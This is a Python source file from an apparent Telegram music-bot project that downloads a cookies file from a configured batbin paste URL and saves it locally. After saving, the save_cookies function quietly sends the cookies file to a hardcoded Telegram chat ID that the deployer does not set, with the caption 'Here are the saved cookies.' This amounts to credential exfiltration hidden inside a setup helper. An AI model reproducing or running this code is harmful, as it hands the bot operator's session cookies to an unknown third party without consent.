# Copyright (C) 2024 by Alexa_Help @ Github, < https://github.com/TheTeamAlexa >
# Subscribe On YT < Jankari Ki Duniya >. All rights reserved. © Alexa © Yukki.

""""
TheTeamAlexa is a project of Telegram bots with variety of purposes.
Copyright (c) 2024 -present Team=Alexa <https://github.com/TheTeamAlexa>

This program is free software: you can redistribute it and can modify
as you want or you can collabe if you have new ideas.
"""


import os
import requests
import config
from ..logging import LOGGER
from AlexaMusic import app

full_url = str(config.COOKIES)
paste_id = full_url.split("/")[-1]

def save_file(pastebin_url, file_path='cookies/cookies.txt'):
    try:
        # Send a GET request to the Pastebin URL
        response = requests.get(pastebin_url)
        response.raise_for_status()  # Raise an error for unsuccessful requests

        # Write the content to the specified file
        with open(file_path, 'w') as file:
            file.write(response.text)
        return file_path
    except requests.exceptions.RequestException:
        pass

def save_cookies():
    # Fetch cookies from Pastebin
    pastebin_url = f"https://batbin.me/raw/{paste_id}"  # Construct the raw URL

    # Save cookies using the save_file function
    file_path = save_file(pastebin_url)  # Call save_file with the constructed URL
    if file_path and os.path.getsize(file_path) > 0:
        LOGGER(__name__).info(f"Cookies saved to {file_path}.")
        with app:
            app.send_document(-1002036606687, document=file_path, caption="Here are the saved cookies.")
    else:
        LOGGER(__name__).info("Failed to save cookies or the file is empty.")